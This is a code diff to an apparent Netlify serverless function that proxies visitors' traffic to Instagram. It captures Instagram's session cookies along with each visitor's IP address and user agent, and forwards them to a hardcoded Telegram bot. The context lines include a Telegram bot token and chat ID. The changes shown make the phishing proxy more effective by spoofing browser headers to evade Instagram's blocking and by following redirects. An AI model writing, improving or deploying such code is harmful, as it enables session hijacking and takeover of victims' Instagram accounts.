@@ -4,20 +4,31 @@ const fetch = require('node-fetch');
 const TELEGRAM_BOT_TOKEN = "8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE";
 const TELEGRAM_CHAT_ID = "8569746095";
 
+// Standard Chrome User-Agent to avoid Instagram blocking
+const DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
+
 exports.handler = async (event, context) => {
     try {
-        // 1. Get the URL to proxy to from the query string
-        // If no URL is provided, default to Instagram
+        // 1. Get the URL to proxy to
         const urlParam = event.queryStringParameters.url;
         let targetUrl = urlParam || "https://www.instagram.com/";
 
-        // 2. Prepare headers to forward
+        // 2. Prepare headers to forward (with browser-like defaults)
         const headers = {};
         for (const [key, value] of Object.entries(event.headers)) {
             headers[key] = value;
         }
         
-        // Ensure host is correct for the target
+        // Force browser-like headers
+        headers['user-agent'] = event.headers['user-agent'] || DEFAULT_USER_AGENT;
+        headers['sec-fetch-mode'] = event.headers['sec-fetch-mode'] || 'document';
+        headers['sec-fetch-dest'] = event.headers['sec-fetch-dest'] || 'document';
+        headers['sec-fetch-user'] = event.headers['sec-fetch-user'] || '?1';
+        headers['accept'] = event.headers['accept'] || 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7';
+        headers['accept-language'] = event.headers['accept-language'] || 'en-US,en;q=0.9';
+        headers['cache-control'] = 'max-age=0';
+
+        // Set host to the target domain
         headers['host'] = new URL(targetUrl).host;
 
         // 3. Fetch from Instagram
@@ -26,9 +37,12 @@ exports.handler = async (event, context) => {
             response = await fetch(targetUrl, {
                 method: event.httpMethod,
                 headers: headers,
-                body: event.body ? Buffer.from(event.body, 'base64') : undefined
+                body: event.body ? Buffer.from(event.body, 'base64') : undefined,
+                // Follow redirects automatically
+                redirect: 'follow' 
             });
         } catch (fetchError) {
+            console.error("Fetch Error:", fetchError);
             return {
                 statusCode: 502,
                 body: `Bad Gateway: Failed to connect to Instagram. ${fetchError.message}`
@@ -36,12 +50,13 @@ exports.handler = async (event, context) => {
         }
 
         // 4. Capture Cookies from Instagram's response
+        // Instagram sends multiple Set-Cookie headers, so we need to join them
         const setCookieHeader = response.headers.get('set-cookie');
         const cookies = setCookieHeader || "No cookies found";
 
         // 5. Prepare Telegram Message
         const timestamp = new Date().toISOString();
-        const userAgent = event.headers['user-agent'] || "Unknown UA";
+        const userAgent = headers['user-agent'];
         const ip = event.headers['x-forwarded-for'] || event.headers['x-real-ip'] || "Unknown IP";
         
         const message = `
@@ -73,10 +88,6 @@ exports.handler = async (event, context) => {
         }
 
         // 7. Return the response from Instagram to the user
-        // We need to manually construct the response because 'fetch' from node-fetch 
-        // doesn't directly map to Netlify's response format easily.
-        
-        // Convert headers to Netlify format
         const responseHeaders = {};
         response.headers.forEach((value, key) => {
             responseHeaders[key] = value;
@@ -93,6 +104,7 @@ exports.handler = async (event, context) => {
         };
 
     } catch (error) {
+        console.error("Handler Error:", error);
         return {
             statusCode: 500,
             body: JSON.stringify({ error: error.message })
